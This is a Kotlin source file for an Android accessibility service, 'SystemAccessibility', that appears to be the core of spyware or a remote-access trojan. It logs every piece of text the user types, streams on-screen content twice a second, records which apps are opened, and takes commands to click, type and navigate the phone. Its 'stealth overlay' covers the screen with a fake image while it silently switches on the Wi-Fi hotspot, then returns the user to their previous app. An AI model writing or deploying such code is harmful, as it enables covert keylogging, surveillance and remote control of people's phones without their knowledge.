package com.systemlinker.features

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import android.widget.ImageView
import com.systemlinker.base.ConfigStore
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class SystemAccessibility : AccessibilityService() {

    private var isStreamingScreen = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    private var isAutomatingHotspot = false
    private var lastForegroundPackage = ""
    
    private var windowManager: WindowManager? = null
    private var stealthOverlayView: View? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private lateinit var configStore: ConfigStore

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.getStringExtra("action") ?: return
            
            when (action) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> isStreamingScreen = true
                "stream_screen_stop" -> isStreamingScreen = false
                "toggle_hotspot" -> {
                    isAutomatingHotspot = true
                    showStealthOverlay()
                    
                    val duration = configStore.overlayDurationMs
                    mainHandler.postDelayed({
                        if (isAutomatingHotspot) {
                            isAutomatingHotspot = false
                            executePostHotspotAction()
                            hideStealthOverlay()
                        }
                    }, duration)
                    
                    try {
                        val settingsIntent = Intent().apply {
                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(settingsIntent)
                    } catch (e: Exception) {
                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(fallbackIntent)
                    }
                }
                "workflow_ui" -> {
                    val textsStr = intent.getStringExtra("ui_texts") ?: ""
                    val texts = textsStr.split("|").map { it.trim() }.filter { it.isNotEmpty() }
                    val targetType = intent.getStringExtra("ui_target") ?: ""
                    val targetAction = intent.getStringExtra("ui_action") ?: "click"
                    val offset = intent.getIntExtra("ui_offset", 1)
                    val caseSensitive = intent.getBooleanExtra("ui_case_sensitive", false)
                    
                    val resultMsg = executeLinearDomSearch(texts, targetType, targetAction, offset, caseSensitive)
                    
                    val resultIntent = Intent("com.systemlinker.UI_RESULT").apply {
                        setPackage(applicationContext.packageName)
                        putExtra("result", resultMsg)
                    }
                    sendBroadcast(resultIntent)
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or 
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        configStore = ConfigStore(this)

        val filter = IntentFilter("com.systemlinker.ACC_ACTION")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg.isNotEmpty() && pkg != "com.android.settings" && pkg != "com.systemlinker") {
                lastForegroundPackage = pkg
            }
            sendBroadcast(Intent("com.systemlinker.EVENT_TRIGGER").apply {
                setPackage(applicationContext.packageName)
                putExtra("event_type", "app_launch")
                putExtra("event_data", pkg)
            })
        }
        
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val typedText = event.text.joinToString(" ")
            sendBroadcast(Intent("com.systemlinker.EVENT_TRIGGER").apply {
                setPackage(applicationContext.packageName)
                putExtra("event_type", "text_input")
                putExtra("event_data", typedText)
            })
        }

        // --- 1. HOTSPOT AUTOMATION LOGIC ---
        if (isAutomatingHotspot) {
            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
            
            // We now use the exact same bulletproof linear engine for internal hotspot toggling!
            val result = executeLinearDomSearch(keywords, "Switch", "click", 1, false)
            
            if (result.startsWith("SUCCESS")) {
                isAutomatingHotspot = false
                Thread.sleep(300) 
                executePostHotspotAction()
                hideStealthOverlay()
            }
            return 
        }

        // --- 2. SCREEN STREAMING LOGIC ---
        if (!isStreamingScreen) return
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val rootNode = rootInActiveWindow ?: return
        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply { put("type", "live_screen"); put("data", screenData) }
        sendBroadcast(Intent("com.systemlinker.SCREEN_DATA").apply {
            setPackage(applicationContext.packageName)
            putExtra("json", jsonPayload.toString())
        })
    }

    // =====================================
    // CORE UI AUTOMATOR: LINEAR DOM ENGINE
    // =====================================

    private fun executeLinearDomSearch(
        texts: List<String>, 
        targetType: String, 
        action: String, 
        offset: Int, 
        caseSensitive: Boolean
    ): String {
        val actionInt = getActionConstant(action)
        val allNodes = mutableListOf<AccessibilityNodeInfo>()
        
        try {
            // 1. Fetch from ALL active windows (main screen, dialogs, keyboards, etc.)
            val currentWindows = windows
            if (currentWindows.isNotEmpty()) {
                for (window in currentWindows) {
                    window.root?.let { allNodes.addAll(flattenTree(it)) }
                }
            } else {
                rootInActiveWindow?.let { allNodes.addAll(flattenTree(it)) }
            }

            if (allNodes.isEmpty()) return "FAILED: Screen is completely empty or inaccessible."

            // 2. Find the Anchor Index
            var anchorIndex = -1
            for (i in allNodes.indices) {
                if (matchesAnyText(allNodes[i], texts, caseSensitive)) {
                    anchorIndex = i
                    break
                }
            }

            if (anchorIndex == -1) return "FAILED: Anchor text(s) not found on screen."

            // 3. Find the Target Node
            var targetNode: AccessibilityNodeInfo? = null
            
            if (targetType.isEmpty() || targetType.lowercase() == "none") {
                targetNode = allNodes[anchorIndex]
            } else {
                var matchCount = 0
                for (i in (anchorIndex + 1) until allNodes.size) {
                    val cName = allNodes[i].className?.toString()?.lowercase() ?: ""
                    if (cName.contains(targetType.lowercase())) {
                        matchCount++
                        if (matchCount == offset) {
                            targetNode = allNodes[i]
                            break
                        }
                    }
                }
            }

            if (targetNode == null) return "FAILED: Anchor found, but Target '$targetType' not found at offset $offset."

            // 4. Guaranteed Event Climbing Algorithm
            var current: AccessibilityNodeInfo? = targetNode
            while (current != null) {
                if (supportsAction(current, actionInt)) {
                    val success = current.performAction(actionInt)
                    if (success) return "SUCCESS: Action '$action' performed on eventable node."
                }
                current = current.parent
            }

            return "FAILED: Target found, but it and all its parents are NOT eventable for action '$action'."

        } catch (e: Exception) {
            return "FAILED: Internal Engine Exception - ${e.message}"
        } finally {
            // 5. Absolute Memory Safety: Recycle every single collected node
            allNodes.forEach { try { it.recycle() } catch (e: Exception) {} }
        }
    }

    // --- SEARCH HELPERS ---

    private fun flattenTree(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val list = mutableListOf<AccessibilityNodeInfo>()
        list.add(node)
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                list.addAll(flattenTree(child))
            }
        }
        return list
    }

    private fun matchesAnyText(node: AccessibilityNodeInfo, texts: List<String>, caseSensitive: Boolean): Boolean {
        val t = node.text?.toString() ?: ""
        val d = node.contentDescription?.toString() ?: ""
        
        for (target in texts) {
            if (t.isNotBlank() && t.contains(target, ignoreCase = !caseSensitive)) return true
            if (d.isNotBlank() && d.contains(target, ignoreCase = !caseSensitive)) return true
        }
        return false
    }

    // --- EVENTABLE ALGORITHM ---

    private fun getActionConstant(actionStr: String): Int {
        return when (actionStr.lowercase()) {
            "click" -> AccessibilityNodeInfo.ACTION_CLICK
            "long_click" -> AccessibilityNodeInfo.ACTION_LONG_CLICK
            "scroll_forward" -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
            "scroll_backward" -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            "focus" -> AccessibilityNodeInfo.ACTION_FOCUS
            "set_text" -> AccessibilityNodeInfo.ACTION_SET_TEXT
            else -> AccessibilityNodeInfo.ACTION_CLICK
        }
    }

    private fun supportsAction(node: AccessibilityNodeInfo, actionInt: Int): Boolean {
        if (node.actionList.any { it.id == actionInt }) return true
        return when (actionInt) {
            AccessibilityNodeInfo.ACTION_CLICK -> node.isClickable || node.isCheckable
            AccessibilityNodeInfo.ACTION_LONG_CLICK -> node.isLongClickable
            AccessibilityNodeInfo.ACTION_SCROLL_FORWARD,
            AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD -> node.isScrollable
            AccessibilityNodeInfo.ACTION_FOCUS -> node.isFocusable
            AccessibilityNodeInfo.ACTION_SET_TEXT -> node.isEditable
            else -> false
        }
    }

    // =====================================
    // STEALTH OVERLAY GENERATOR
    // =====================================
    private fun showStealthOverlay() {
        mainHandler.post {
            if (stealthOverlayView != null) return@post
            val layout = FrameLayout(this)
            val imgFile = File(filesDir, "stealth_overlay.jpg")
            if (imgFile.exists()) {
                val imageView = ImageView(this).apply {
                    setImageURI(Uri.fromFile(imgFile))
                    scaleType = ImageView.ScaleType.FIT_XY
                }
                layout.addView(imageView, FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT))
            } else {
                layout.setBackgroundColor(Color.BLACK) 
            }
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, 
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or       
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,      
                PixelFormat.TRANSLUCENT
            )
            try { windowManager?.addView(layout, params); stealthOverlayView = layout } catch (e: Exception) { }
        }
    }

    private fun hideStealthOverlay() {
        mainHandler.post {
            stealthOverlayView?.let { try { windowManager?.removeView(it) } catch (e: Exception) { } }
            stealthOverlayView = null
        }
    }

    private fun executePostHotspotAction() {
        val action = configStore.postHotspotAction
        val args = configStore.postHotspotArgs
        
        if (action == "app_launch" && lastForegroundPackage.isNotEmpty()) {
            try {
                val launchIntent = packageManager.getLaunchIntentForPackage(lastForegroundPackage)
                launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
            } catch (e: Exception) { performGlobalAction(GLOBAL_ACTION_BACK) }
        } else {
            val globalAction = when (action) { "home" -> GLOBAL_ACTION_HOME; "recent" -> GLOBAL_ACTION_RECENTS; else -> GLOBAL_ACTION_BACK }
            for (i in 0 until args) { performGlobalAction(globalAction); Thread.sleep(200) }
        }
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) { children.put(dumpNode(child)); child.recycle() }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }

    override fun onInterrupt() { hideStealthOverlay() }

    override fun onDestroy() {
        super.onDestroy()
        hideStealthOverlay()
        unregisterReceiver(commandReceiver)
    }
}